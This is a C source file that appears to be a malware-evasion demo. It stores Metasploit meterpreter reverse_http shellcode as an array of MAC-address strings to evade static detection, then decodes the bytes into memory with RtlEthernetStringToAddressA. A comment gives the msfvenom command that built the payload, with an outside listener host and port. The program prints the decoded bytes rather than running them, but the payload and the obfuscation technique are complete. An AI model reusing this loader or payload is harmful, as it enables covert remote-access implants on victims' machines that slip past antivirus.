#include <Windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

// read array of shellcode formatted as MAC addresses
// https://gitlab.com/ORCA000/hellshell/-/blob/main/MacFuscation/MacFuscation.cpp
// https://infosecwriteups.com/the-art-of-obfuscation-evading-static-malware-detection-f4663ae4716f

// compile: 
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tcbin2mac.c /link /OUT:bin2mac.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// Define our ustring struct
struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int DecodeMACFuscation(const char* MAC[], void * LpBaseAddress, int arrSize) {	
	PCSTR Terminator = NULL;
	void * LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	int i = 0;
	for (int j = 0; j < arrSize; j++) {
		LpBaseAddress2 = ((ULONG_PTR)LpBaseAddress + i);
		if (RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, LpBaseAddress2) != STATUS_SUCCESS) {
			printf("[!] RtlEthernetStringToAddressA failed for %s result %x", MAC[j], STATUS);
			return 1;
		}
		else {
			i = i + 6;
		}
	}
	return 0;
}

int main(void) {
	// Shellcode as array of MAC Addresses
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 bin2mac.py -i met.bin
	

	const char* MACs[] = {
 	  "fc-48-83-e4-f0-e8", "cc-00-00-00-41-51", "41-50-52-48-31-d2", "65-48-8b-52-60-48",
 	  "8b-52-18-48-8b-52", "20-51-56-48-0f-b7", "4a-4a-48-8b-72-50", "4d-31-c9-48-31-c0",
 	  "ac-3c-61-7c-02-2c", "20-41-c1-c9-0d-41", "01-c1-e2-ed-52-48", "8b-52-20-8b-42-3c",
 	  "41-51-48-01-d0-66", "81-78-18-0b-02-0f", "85-72-00-00-00-8b", "80-88-00-00-00-48",
 	  "85-c0-74-67-48-01", "d0-44-8b-40-20-49", "01-d0-8b-48-18-50", "e3-56-48-ff-c9-41",
 	  "8b-34-88-4d-31-c9", "48-01-d6-48-31-c0", "ac-41-c1-c9-0d-41", "01-c1-38-e0-75-f1",
 	  "4c-03-4c-24-08-45", "39-d1-75-d8-58-44", "8b-40-24-49-01-d0", "66-41-8b-0c-48-44",
 	  "8b-40-1c-49-01-d0", "41-8b-04-88-41-58", "41-58-48-01-d0-5e", "59-5a-41-58-41-59",
 	  "41-5a-48-83-ec-20", "41-52-ff-e0-58-41", "59-5a-48-8b-12-e9", "4b-ff-ff-ff-5d-48",
 	  "31-db-53-49-be-77", "69-6e-69-6e-65-74", "00-41-56-48-89-e1", "49-c7-c2-4c-77-26",
 	  "07-ff-d5-53-53-e8", "70-00-00-00-4d-6f", "7a-69-6c-6c-61-2f", "35-2e-30-20-28-57",
 	  "69-6e-64-6f-77-73", "20-4e-54-20-31-30", "2e-30-3b-20-57-69", "6e-36-34-3b-20-78",
 	  "36-34-29-20-41-70", "70-6c-65-57-65-62", "4b-69-74-2f-35-33", "37-2e-33-36-20-28",
 	  "4b-48-54-4d-4c-2c", "20-6c-69-6b-65-20", "47-65-63-6b-6f-29", "20-43-68-72-6f-6d",
 	  "65-2f-31-33-31-2e", "30-2e-30-2e-30-20", "53-61-66-61-72-69", "2f-35-33-37-2e-33",
 	  "36-00-59-53-5a-4d", "31-c0-4d-31-c9-53", "53-49-ba-3a-56-79", "a7-00-00-00-00-ff",
 	  "d5-e8-10-00-00-00", "31-39-32-2e-31-36", "38-2e-31-39-30-2e", "31-33-34-00-5a-48",
 	  "89-c1-49-c7-c0-50", "00-00-00-4d-31-c9", "53-53-6a-03-53-49", "ba-57-89-9f-c6-00",
 	  "00-00-00-ff-d5-e8", "4b-00-00-00-2f-75", "77-44-69-59-52-4e", "72-63-6d-7a-4f-37",
 	  "4d-5f-75-70-73-41", "42-50-77-6a-5f-6c", "6e-69-6b-34-38-37", "5f-47-61-42-32-53",
 	  "4d-74-65-31-6c-6a", "58-66-44-50-74-39", "39-46-62-74-51-41", "58-35-71-56-62-31",
 	  "52-69-41-54-4a-4f", "6e-71-76-78-75-2d", "00-48-89-c1-53-5a", "41-58-4d-31-c9-53",
 	  "48-b8-00-02-28-84", "00-00-00-00-50-53", "53-49-c7-c2-eb-55", "2e-3b-ff-d5-48-89",
 	  "c6-6a-0a-5f-53-5a", "48-89-f1-4d-31-c9", "4d-31-c9-53-53-49", "c7-c2-2d-06-18-7b",
 	  "ff-d5-85-c0-75-1f", "48-c7-c1-88-13-00", "00-49-ba-44-f0-35", "e0-00-00-00-00-ff",
 	  "d5-48-ff-cf-74-02", "eb-cc-e8-55-00-00", "00-53-59-6a-40-5a", "49-89-d1-c1-e2-10",
 	  "49-c7-c0-00-10-00", "00-49-ba-58-a4-53", "e5-00-00-00-00-ff", "d5-48-93-53-53-48",
 	  "89-e7-48-89-f1-48", "89-da-49-c7-c0-00", "20-00-00-49-89-f9", "49-ba-12-96-89-e2",
 	  "00-00-00-00-ff-d5", "48-83-c4-20-85-c0", "74-b2-66-8b-07-48", "01-c3-85-c0-75-d2",
 	  "58-c3-58-6a-00-59", "49-c7-c2-f0-b5-a2", "56-ff-d5-90-90-90" };
	
	// declare a variable for our shellcode size
 	unsigned int shellcode_size = (sizeof(MACs) / sizeof(MACs[0])) * 6; 
	printf("shellcode size: %d\n", shellcode_size);
	printf("size of array: %d\n", sizeof(MACs) / sizeof(MACs[0]));
	
	// Declare a buffer for storing our shellcode
	PVOID buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	
	// Decode IPs and copy into memory
	if (DecodeMACFuscation(&MACs, buffer, sizeof(MACs) / sizeof(MACs[0])) != 0) {
		return -1;
	}

	// create a new struct from the buffer we allocated
	_data.Buffer = buffer;
	_data.Length = shellcode_size;
	
	int idx = 0;
	while ( idx < _data.Length)
	{
		if (idx == (shellcode_size - 1) )
		{
			printf("0x%02x ", _data.Buffer[idx]);
		}
		else
		{
			printf("0x%02x, ", _data.Buffer[idx]);
		}
		idx++;
	}

    return 0;
}

